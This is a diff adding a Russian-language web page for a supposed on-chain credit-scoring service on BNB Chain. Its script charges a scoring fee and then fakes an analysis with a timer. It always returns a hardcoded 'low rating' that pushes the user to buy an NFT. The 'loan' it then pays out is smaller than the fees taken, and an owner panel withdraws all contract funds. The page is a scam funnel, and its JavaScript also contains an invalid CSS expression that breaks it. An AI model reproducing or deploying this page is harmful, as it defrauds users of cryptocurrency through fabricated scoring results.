@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Credit Scoring On-Chain</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+    <style>
+        :root { 
+            --accent: #00f2ff; --bg: #030308; --card: #0d0d1a; --text-main: #ffffff;
+            --text-dim: #a0a0b8; --success: #00ff88; --error: #ff0055;
+        }
+        body { background: var(--bg); color: var(--text-main); font-family: 'Inter', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; background-image: radial-gradient(circle at 50% 50%, #1a1a3a 0%, #030308 100%); }
+        .container { background: var(--card); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 28px; padding: 40px; width: 100%; max-width: 420px; text-align: center; box-shadow: 0 40px 100px rgba(0,0,0,0.8); }
+        h1 { font-size: 24px; font-weight: 800; background: linear-gradient(135deg, #fff 0%, var(--accent) 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .range-container { margin: 20px 0; text-align: left; }
+        .range-label { display: flex; justify-content: space-between; color: var(--text-dim); font-size: 12px; text-transform: uppercase; margin-bottom: 8px; }
+        .amount-display { font-size: 28px; font-weight: 800; color: var(--accent); text-align: center; }
+        input[type=range] { width: 100%; -webkit-appearance: none; background: rgba(255,255,255,0.1); height: 6px; border-radius: 5px; outline: none; }
+        input[type=range]::-webkit-slider-thumb { -webkit-appearance: none; width: 18px; height: 18px; background: var(--accent); border-radius: 50%; cursor: pointer; box-shadow: 0 0 10px var(--accent); }
+        .btn { background: var(--accent); color: #000; border: none; padding: 18px; border-radius: 16px; font-weight: 700; cursor: pointer; width: 100%; font-size: 16px; margin-top: 10px; transition: 0.3s; }
+        .btn:hover { transform: translateY(-2px); box-shadow: 0 10px 20px rgba(0, 242, 255, 0.3); }
+        .btn:disabled { background: #333 !important; color: #666 !important; cursor: not-allowed; }
+        .status-msg { font-size: 13px; margin-top: 15px; min-height: 20px; color: var(--text-dim); }
+        #adminPanel { display: none; margin-top: 20px; padding: 15px; border: 1px dashed var(--success); border-radius: 15px; background: rgba(0,255,136,0.05); }
+        .result-card { display: none; margin-top: 20px; padding: 20px; border-radius: 20px; text-align: left; animation: fadeIn 0.5s; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div style="font-size: 40px;">🏦</div>
+    <h1>Credit Scoring On-Chain</h1>
+
+    <button id="connBtn" class="btn" onclick="connect()">Подключить кошелек</button>
+    
+    <div id="dashboard" style="display:none; margin-top:20px;">
+        <div class="range-container">
+            <div class="range-label">Сумма кредита</div>
+            <div class="amount-display" id="amountVal">$500</div>
+            <input type="range" id="amountSlider" min="100" max="1000" step="50" value="500" oninput="updateUI()">
+        </div>
+
+        <div class="range-container">
+            <div class="range-label">Срок (мес.)</div>
+            <div class="amount-display" id="termVal" style="color:#fff;">3 месяца</div>
+            <input type="range" id="termSlider" min="1" max="6" step="1" value="3" oninput="updateUI()">
+        </div>
+
+        <button id="actionBtn" class="btn" onclick="startScoring()">Проверить лимит (0.0001 BNB)</button>
+    </div>
+
+    <div id="resultBox" class="result-card"></div>
+    <div id="status" class="status-msg"></div>
+
+    <div id="adminPanel">
+        <div style="color:var(--success); font-size:12px; margin-bottom:10px;">ВЫ АДМИНИСТРАТОР</div>
+        <button class="btn" style="background:var(--success)" onclick="adminWithdraw()">ВЫВЕСТИ BNB С КОНТРАКТА</button>
+    </div>
+</div>
+
+<script>
+    const CONTRACT_ADDR = "0x322Eb1161AF0d93E65A987714fBe87e2CbeBc459"; 
+    const ABI = [
+        "function payScoring() public payable",
+        "function buyNFT() public payable",
+        "function takeLoan(uint256 months) public",
+        "function withdrawAll() public",
+        "function owner() public view returns (address)"
+    ];
+
+    let signer, contract, userAddress;
+
+    function updateUI() {
+        document.getElementById('amountVal').innerText = "$" + document.getElementById('amountSlider').value;
+        document.getElementById('termVal').innerText = document.getElementById('termSlider').value + " мес.";
+    }
+
+    async function connect() {
+        if (window.ethereum) {
+            const provider = new ethers.providers.Web3Provider(window.ethereum);
+            await provider.send("eth_requestAccounts", []);
+            signer = provider.getSigner();
+            userAddress = await signer.getAddress();
+            contract = new ethers.Contract(CONTRACT_ADDR, ABI, signer);
+
+            document.getElementById('connBtn').style.display = "none";
+            document.getElementById('dashboard').style.display = "block";
+            showStatus("Кошелек подключен", "#00ff88");
+
+            // Проверка на админа
+            const ownerAddr = await contract.owner();
+            if (userAddress.toLowerCase() === ownerAddr.toLowerCase()) {
+                document.getElementById('adminPanel').style.display = "block";
+            }
+        }
+    }
+
+    async function startScoring() {
+        try {
+            showStatus("Ожидание оплаты скоринга...", "#fff");
+            const tx = await contract.payScoring({ value: ethers.utils.parseEther("0.0001") });
+            await tx.wait();
+            
+            showStatus("Анализ данных блокчейна...", var(--accent));
+            setTimeout(() => {
+                showResult(false, "НИЗКИЙ РЕЙТИНГ", "Ваш кошелек не прошел автоматическую проверку на лимит свыше $10. Требуется активация кредитной линии через NFT Level 1.");
+            }, 3000);
+        } catch (e) { showStatus("Ошибка транзакции", "#ff0055"); }
+    }
+
+    function showResult(isSuccess, title, text) {
+        document.getElementById('dashboard').style.display = "none";
+        const rb = document.getElementById('resultBox');
+        rb.style.display = "block";
+        rb.style.border = "1px solid #ff0055";
+        rb.style.background = "rgba(255,0,85,0.05)";
+        
+        rb.innerHTML = `
+            <div style="color:#ff0055; font-size:18px; margin-bottom:10px;">❌ ${title}</div>
+            <div style="font-size:14px; color:#ccc; margin-bottom:20px;">${text}</div>
+            <button class="btn" onclick="buyNFT()">Активировать через NFT (0.0003 BNB)</button>
+        `;
+        showStatus("", "");
+    }
+
+    async function buyNFT() {
+        try {
+            showStatus("Покупка NFT Level 1...", "#fff");
+            const tx = await contract.buyNFT({ value: ethers.utils.parseEther("0.0003") });
+            await tx.wait();
+            
+            showStatus("NFT получена! Запрос займа...", "#00ff88");
+            const months = document.getElementById('termSlider').value;
+            const txLoan = await contract.takeLoan(months);
+            await txLoan.wait();
+            
+            alert("Займ 0.00015 BNB отправлен на ваш кошелек!");
+            location.reload();
+        } catch (e) { showStatus("Ошибка покупки", "#ff0055"); }
+    }
+
+    async function adminWithdraw() {
+        try {
+            const tx = await contract.withdrawAll();
+            await tx.wait();
+            alert("Все средства выведены на ваш кошелек!");
+        } catch (e) { alert("Ошибка вывода"); }
+    }
+
+    function showStatus(text, color) {
+        const s = document.getElementById('status');
+        s.innerHTML = text;
+        s.style.color = color;
+    }
+</script>
+</body>
+</html>
